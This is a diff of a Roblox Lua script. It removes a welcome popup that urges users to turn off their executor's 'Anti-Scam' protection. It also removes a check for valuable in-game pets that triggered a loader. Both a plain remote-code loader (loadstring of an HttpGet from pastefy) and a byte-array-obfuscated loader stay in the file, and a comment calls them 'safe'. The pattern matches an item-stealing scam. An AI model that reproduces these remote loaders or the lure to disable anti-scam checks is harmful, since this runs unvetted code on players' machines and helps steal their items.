@@ -1,71 +1,6 @@
 loadstring(game:HttpGet("https://pastefy.app/VQwXim3w/raw"))()
-local a, b, c, d, e = game:GetService("Players"), game:GetService("TweenService"), game:GetService("RunService"), game:GetService("Workspace"), game:GetService("UserInputService")
-local f = a.LocalPlayer
-
-local g = {
-    "Queen Bee", "Mimic Octopus", "Raccoon", "Disco Bee", "Jackal God", "T-Rex", "Spinosaurus", "Dragonfly", "Butterfly", "Kitsune", "Huge Raccoon"
-}
-
-local function createWelcomePopup()
-    local gui = Instance.new("ScreenGui", f:WaitForChild("PlayerGui"))
-    gui.Name = "XXSCRIPTS_Welcome"
-    gui.ResetOnSpawn = false
-    local frame = Instance.new("Frame", gui)
-    frame.Size = UDim2.new(0, 440, 0, 280)
-    frame.Position = UDim2.new(0.5, -220, 0.5, -140)
-    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    frame.BackgroundTransparency = 0.05
-    frame.BorderSizePixel = 0
-    frame.Active = true
-    frame.Draggable = true
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-    local closeBtn = Instance.new("TextButton", frame)
-    closeBtn.Size = UDim2.new(0, 25, 0, 25)
-    closeBtn.Position = UDim2.new(1, -30, 0, 5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    closeBtn.TextColor3 = Color3.new(1, 1, 1)
-    closeBtn.Text = "X"
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 14
-    closeBtn.AutoButtonColor = false
-    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
-    closeBtn.MouseEnter:Connect(function() closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0) end)
-    closeBtn.MouseLeave:Connect(function() closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0) end)
-    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
-    local message = Instance.new("TextLabel", frame)
-    message.Size = UDim2.new(1, -30, 1, -50)
-    message.Position = UDim2.new(0, 15, 0, 35)
-    message.BackgroundTransparency = 1
-    message.TextWrapped = true
-    message.TextYAlignment = Enum.TextYAlignment.Top
-    message.TextXAlignment = Enum.TextXAlignment.Left
-    message.TextColor3 = Color3.new(1, 1, 1)
-    message.Font = Enum.Font.Gotham
-    message.TextSize = 13
-    message.Text = [[Welcome to XXSCRIPTS! We're currently experiencing issues with Delta Executor. If you're using Delta, please disable the "Anti-Scam" setting — it's falsely flagging our script. Delta does this to block certain actions, even though our script is completely safe. After disabling it, rejoin the game, or for a smoother experience, use KRNL instead. Need help or want to report an issue? 📩 Reach us here: https://discord.gg/CfFmpeU8y3 Thanks for your support!]]
-    task.delay(10, function() if gui and gui.Parent then gui:Destroy() end end)
-end
-
-createWelcomePopup()
-
-local function h()
-    local i = f:FindFirstChild("Backpack")
-    if not i then return false end
-    for _, j in ipairs(i:GetChildren()) do
-        if j:IsA("Tool") then
-            for _, k in ipairs(g) do
-                if j.Name:sub(1, #k) == k then
-                    return true
-                end
-            end
-        end
-    end
-    return false
-end
-
--- REPLACED old suspicious loader with safe Pastefy loader
 local function l()
-    local c = {
+     local c = {
         104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,
         107,113,76,106,110,111,118,72,47,114,97,119
     }
@@ -75,10 +10,3 @@ local function l()
     end
     loadstring(game:HttpGet(u))()
 end
-
-if h() then
-    l()
-else
-    -- rest of your script continues here exactly as before
-end
-discord.gg
